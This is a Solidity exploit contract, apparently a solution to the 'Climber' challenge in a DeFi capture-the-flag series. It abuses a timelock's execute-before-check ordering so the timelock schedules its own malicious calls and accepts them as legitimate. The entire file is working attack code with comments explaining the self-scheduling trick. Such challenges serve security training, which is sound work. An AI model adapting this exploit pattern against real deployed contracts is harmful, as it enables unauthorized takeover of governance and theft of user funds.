//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";

contract AttackerClimber {
    ClimberTimelock public lock;

    address[] public targets;
    uint256[] public values;
    bytes[] public calldatas;

    constructor(address payable _lock) {
        lock = ClimberTimelock(_lock);
    }

    /**
     * Used to schedule scheduling of all 3 malicious calls, including this one
     * @dev this is done because the calldata for `selfSchedule` is unknown until itself is encoded (so we have to encode this malicious `schedule` to trigger malicious scheduling)
     * so we encode this function's calldata, set it in storage and then trigger execution through timelock where `selfSchedule` will schedule all previous calls
     * so that the timelock would accept them as "scheduled"
     * @param _salt .
     */
    function selfSchedule(bytes32 _salt) external {
        lock.schedule(targets, values, calldatas, _salt);
    }

    function schedule(address[] calldata _targets, uint256[] calldata _values, bytes[] calldata _dataElements, bytes32 _salt) public {
        lock.schedule(_targets, _values, _dataElements, _salt);
    }

    // Setters to aid with `selfSchedule`
    function setCalldatas(bytes[] memory _calldatas) public {
        calldatas = _calldatas;
    }

    function setTargets(address[] memory _targets) public {
        targets = _targets;
    }

    function setValues(uint256[] memory _values) public {
        values = _values;
    }
}
